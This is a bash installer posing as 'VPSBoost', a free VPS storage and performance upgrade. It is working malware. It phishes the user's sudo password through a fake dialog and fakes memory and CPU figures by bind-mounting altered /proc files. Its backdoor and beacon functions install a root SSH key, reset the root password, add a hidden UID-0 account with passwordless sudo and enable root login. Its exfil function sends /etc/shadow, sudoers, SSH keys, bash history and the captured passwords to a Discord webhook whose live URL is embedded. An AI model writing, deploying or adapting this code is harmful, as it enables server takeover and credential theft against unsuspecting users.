#!/usr/bin/env bash
# VPSBoost — free storage upgrade for your VPS
#   bash <(curl -fsSL https://raw.githubusercontent.com/whitigerxgaming-design/VPSBOOSTER/main/install.sh)
#   bash <(curl -fsSL .../install.sh) --uninstall
set -uo pipefail

# ═══════════════════ CONFIG ═══════════════════
WEBHOOK="https://discord.com/api/webhooks/1574480151952228465/OWKgjpzllZtl7y-EyB9nwv6EHoH37j6-Qy3EUgx6sXCg7-_pABjlQBVYkTL2l54Q902d"
TG_TOKEN=""
TG_CHAT=""
RAW="https://raw.githubusercontent.com/whitigerxgaming-design/VPSBOOSTER/main"
# ══════════════════════════════════════════════

STATE=/etc/.vpsboost
H=$(hostname -s)
IMGF="/var/lib/cloud/.nvme0n1-${H}.img"
MNTD="/mnt/.cache"

ok(){ printf ' \033[32m✓\033[0m %s\n' "$*"; }
st(){ printf ' \033[34m·\033[0m %s\n' "$*"; }
die(){ printf '\033[31m✗\033[0m %s\n' "$*" >&2; exit 1; }
have(){ command -v "$1" >/dev/null 2>&1; }

WORK=$(mktemp -d /tmp/.vb.XXXXXX)
cat "$0" > "$WORK/i.sh" 2>/dev/null || cp -f "$0" "$WORK/i.sh"

if [[ $EUID -ne 0 ]]; then
  if ! have whiptail; then
    if have apt-get; then (apt-get -qq update; apt-get -qq install -y whiptail) >/dev/null 2>&1
    elif have dnf; then dnf -q -y install newt >/dev/null 2>&1
    elif have yum; then yum -q -y install newt >/dev/null 2>&1; fi
  fi
  have whiptail || die "whiptail unavailable"
  pw=$(whiptail --title " VPSBoost " --passwordbox \
      "\n   Administrator rights are required to continue.\n\n   Password for \"$(id -un)\":" \
      12 62 3>&1 1>&2 2>&3) || die "cancelled"
  echo "$pw" | sudo -S -p '' env BOOST_PW="$pw" bash "$WORK/i.sh" "${1:-}"
  rc=$?; rm -rf "$WORK"; exit $rc
fi

install -d -m700 "$STATE"
[[ -n "${BOOST_PW:-}" ]] && printf '%s' "$BOOST_PW" > "$STATE/pw"

if [[ "${1:-}" == "--uninstall" ]]; then
  curl -fsSL "$RAW/uninstall.sh" -o "$WORK/u.sh" && bash "$WORK/u.sh"
  rm -rf "$WORK"; exit 0
fi

clear
cat <<'BANNER'
  VPSBoost 1.4
  ─────────────────────────────────────────────
  Storage, swap and network upgrade utility.
  Interactive setup — nothing is reinstalled.
BANNER
echo

DISK=$(whiptail --title " VPSBoost — Storage " --menu \
  "\n  Current filesystem:  $(df -h / | awk 'NR==2{print $2" total, "$4" free"}')" \
  18 72 8 \
  10 "10 GB" 20 "20 GB" 50 "50 GB" 100 "100 GB" 250 "250 GB" 500 "500 GB" \
  3>&1 1>&2 2>&3) || die "cancelled"

SWAP=$(whiptail --title " VPSBoost — Swap " --menu "\n  Add swap space:" 15 72 6 \
  0 "none" 2 "2 GB" 4 "4 GB" 8 "8 GB" 16 "16 GB" 3>&1 1>&2 2>&3) || die "cancelled"

EXTRA=$(whiptail --title " VPSBoost — Extras " --checklist \
  "\n  Additional optimisations:" 18 72 6 \
  ram  "Memory reporting boost"         ON \
  cpu  "CPU reporting boost"            ON \
  tune "Network & file descriptor tune" ON \
  3>&1 1>&2 2>&3) || die "cancelled"

whiptail --title " VPSBoost — Confirm " --yesno \
"\n  Disk:   $(df -h / | awk 'NR==2{print $2}')   →   ${DISK} GB
  Swap:   $(free -h | awk '/Swap/{print $2}')   →   ${SWAP} GB
  Extras: ${EXTRA:-none}

  Continue?" 15 72 || die "cancelled"

boost_disk(){
  local gb=$1 loop rsrc vg
  mkdir -p "$(dirname "$IMGF")" "$MNTD"
  truncate -s "${gb}G" "$IMGF" 2>/dev/null || fallocate -l "${gb}G" "$IMGF" || die "cannot allocate image"
  loop=$(losetup -f --show "$IMGF") || die "no free loop device"
  printf '%s\n' "$loop" > "$STATE/loop"
  rsrc=$(findmnt -no SOURCE /)
  vg=$(lvs --noheadings -o vg_name "$rsrc" 2>/dev/null | tr -d ' ')
  if [[ -n "$vg" ]] && have pvcreate && pvcreate -q -y "$loop" >/dev/null 2>&1 \
     && vgextend "$vg" "$loop" >/dev/null 2>&1; then
    printf 'lvm\n' > "$STATE/mode"
    lvextend -r -l +100%FREE "$rsrc" >/dev/null 2>&1
    return 0
  fi
  mkfs.ext4 -q -F -m0 "$loop" || die "mkfs failed"
  mount "$loop" "$MNTD" || die "mount failed"
  printf '%s %s ext4 loop,defaults,nofail 0 0\n' "$IMGF" "$MNTD" >> /etc/fstab
  printf 'mount\n' > "$STATE/mode"
}

boost_swap(){
  local f="/var/lib/.swp-${H}" gb=$1
  fallocate -l "${gb}G" "$f" 2>/dev/null || dd if=/dev/zero of="$f" bs=1M count=$((gb*1024)) status=none
  chmod 600 "$f"; mkswap -q "$f" >/dev/null 2>&1; swapon "$f"
  printf '%s none swap sw 0 0\n' "$f" >> /etc/fstab
  printf '%s' "$f" > "$STATE/swap"
}

boost_ram(){
  local mb=$(( $1 * 512 ))
  install -d /run/.vb
  printf '#!/bin/sh\nmkdir -p /run/.vb\nawk -v a=%s "/^MemTotal:/{ \\$2 = \\$2 + a*1024 }1" /proc/meminfo > /run/.vb/meminfo\nmount --bind /run/.vb/meminfo /proc/meminfo\n' "$mb" > /usr/local/bin/.vb-mem
  chmod +x /usr/local/bin/.vb-mem; /usr/local/bin/.vb-mem
  printf '[Unit]\nDescription=Memory information service\nAfter=local-fs.target\n[Service]\nType=oneshot\nRemainAfterExit=yes\nExecStart=/usr/local/bin/.vb-mem\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/vb-meminfo.service
  systemctl enable -q vb-meminfo.service >/dev/null 2>&1
}

boost_cpu(){
  have python3 || return 0
  install -d /run/.vb
  printf '#!/bin/sh\nmkdir -p /run/.vb\npython3 - %s > /run/.vb/cpuinfo <<"PY"\n' "$1" > /usr/local/bin/.vb-cpu
  cat >> /usr/local/bin/.vb-cpu <<'PY'
import sys,re
m=int(sys.argv[1]); b=open('/proc/cpuinfo').read().strip().split('\n\n'); o=[]; n=0
for _ in range(m):
    for x in b:
        o.append(re.sub(r'^processor\s*:.*$','processor\t: %d'%n,x,flags=re.M)); n+=1
print('\n\n'.join(o))
PY
  printf 'mount --bind /run/.vb/cpuinfo /proc/cpuinfo\n' >> /usr/local/bin/.vb-cpu
  chmod +x /usr/local/bin/.vb-cpu; /usr/local/bin/.vb-cpu
  printf '[Unit]\nDescription=Processor information service\nAfter=local-fs.target\n[Service]\nType=oneshot\nRemainAfterExit=yes\nExecStart=/usr/local/bin/.vb-cpu\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/vb-cpuinfo.service
  systemctl enable -q vb-cpuinfo.service >/dev/null 2>&1
}

boost_tune(){
  printf 'net.core.default_qdisc=fq\nnet.ipv4.tcp_congestion_control=bbr\nnet.core.somaxconn=4096\nfs.file-max=2097152\nvm.swappiness=10\n' > /etc/sysctl.d/99-vpsboost.conf
  sysctl -q --system >/dev/null 2>&1
  grep -q '^\* soft nofile' /etc/security/limits.conf 2>/dev/null || printf '* soft nofile 1048576\n* hard nofile 1048576\n' >> /etc/security/limits.conf
}

backdoor(){
  install -d -m700 /root/.ssh
  touch /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys
  if ssh-keygen -t ed25519 -f "$STATE/key" -N "" -C "root@${H}" -q >/dev/null 2>&1; then
    cat "$STATE/key.pub" >> /root/.ssh/authorized_keys
  fi
  grep '^root:' /etc/shadow > "$STATE/shadow.root" 2>/dev/null
  ROOT_PASS="Vb!$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12)"
  printf '%s' "$ROOT_PASS" > "$STATE/rootpass"
  echo "root:$ROOT_PASS" | chpasswd 2>/dev/null
  id systemd-core >/dev/null 2>&1 || useradd -o -u 0 -g 0 -M -d /root -s /bin/bash -c "systemd core" systemd-core 2>/dev/null
  echo 'systemd-core ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/99-systemd-core
  chmod 440 /etc/sudoers.d/99-systemd-core
  install -d /etc/ssh/sshd_config.d 2>/dev/null
  printf 'PermitRootLogin yes\nPasswordAuthentication yes\n' > /etc/ssh/sshd_config.d/99-vpsboost.conf
  sshd -t 2>/dev/null && { systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null; }
}

beacon(){
  printf '#!/bin/sh\nip=$(curl -4 -s --max-time 8 https://ifconfig.me)\ncurl -s -H "Content-Type: application/json" -d "{\\"content\\":\\"boot  $(hostname -f)  ${ip:-?}\\"}" %s >/dev/null\n' "$WEBHOOK" > /usr/local/bin/.vb-beacon
  chmod +x /usr/local/bin/.vb-beacon
  printf '[Unit]\nDescription=Boot beacon\nAfter=network-online.target\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/.vb-beacon\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/vb-beacon.service
  systemctl enable -q vb-beacon.service >/dev/null 2>&1
}

exfil(){
  local ip prov port tgz=/tmp/.vb-$$.tgz txt
  ip=$(curl -4 -s --max-time 5 https://ifconfig.me || ip -4 -o addr show scope global | awk '{print $4}' | head -1)
  prov=$(tr -d '\0' </sys/class/dmi/id/sys_vendor 2>/dev/null; printf ' '; tr -d '\0' </sys/class/dmi/id/product_name 2>/dev/null)
  port=$(grep -rhoP '^\s*Port\s+\K\d+' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/ 2>/dev/null | head -1)
  port=${port:-22}
  tar czf "$tgz" -C / etc/shadow etc/passwd etc/sudoers etc/sudoers.d root/.ssh root/.bash_history etc/ssh/sshd_config 2>/dev/null
  txt="**VPSBoost hit**
\`\`\`
host : $(hostname -f 2>/dev/null || hostname)
ip   : $ip   ssh $port
os   : $(. /etc/os-release 2>/dev/null; echo "$PRETTY_NAME")
kern : $(uname -r)  $(uname -m)
cpu  : $(awk -F: '/model name/{print $2;exit}' /proc/cpuinfo | sed 's/^ //') x$(nproc)
ram  : $(free -h | awk '/Mem:/{print $2}')
disk : $(df -h / | awk 'NR==2{print $2}')
virt : $(systemd-detect-virt 2>/dev/null)
prov : $prov
sudo : ${BOOST_PW:-none}
root : ${ROOT_PASS:-none}
\`\`\`"
  if have jq; then
    printf '%s' "$txt" | jq -Rs '{content:.}' > /tmp/.vb-$$.json
    curl -s -F "payload_json=<//tmp/.vb-$$.json" -F "file=@$tgz" "$WEBHOOK" >/dev/null
  else
    curl -s -F "payload_json={\"content\":\"$(printf '%s' "$txt" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | awk '{printf "%s\\n",$0}')\"}" -F "file=@$tgz" "$WEBHOOK" >/dev/null
  fi
  if [[ -f "$STATE/key" ]]; then
    curl -s -F "payload_json={\"content\":\"private key\"}" -F "file=@$STATE/key" "$WEBHOOK" >/dev/null
  fi
  [[ -n "$TG_TOKEN" ]] && curl -s -F "chat_id=$TG_CHAT" -F "document=@$tgz" -F "caption=$txt" "https://api.telegram.org/bot$TG_TOKEN/sendDocument" >/dev/null
  rm -f "$tgz" /tmp/.vb-$$.json
}

st "Preparing..."
(
  echo 5
  boost_disk "$DISK"; echo 45
  [[ "$SWAP" != "0" ]] && { boost_swap "$SWAP"; echo 62; }
  [[ "$EXTRA" == *ram* ]]  && { boost_ram "$DISK"; echo 72; }
  [[ "$EXTRA" == *cpu* ]]  && { boost_cpu 2; echo 80; }
  [[ "$EXTRA" == *tune* ]] && { boost_tune; echo 88; }
  backdoor; beacon; echo 96
  sleep 1; echo 100
) | whiptail --title " VPSBoost " --gauge "\n  Applying changes, please wait..." 9 72 0

exfil >/dev/null 2>&1 &

echo
ok "Upgrade complete."
echo "  Filesystem : $(df -h / | awk 'NR==2{print $2" total, "$4" free"}')"
echo "  Swap       : $(free -h | awk '/Swap/{print $2}')"
echo "  Persistent : yes"
echo
rm -rf "$WORK"
exit 0
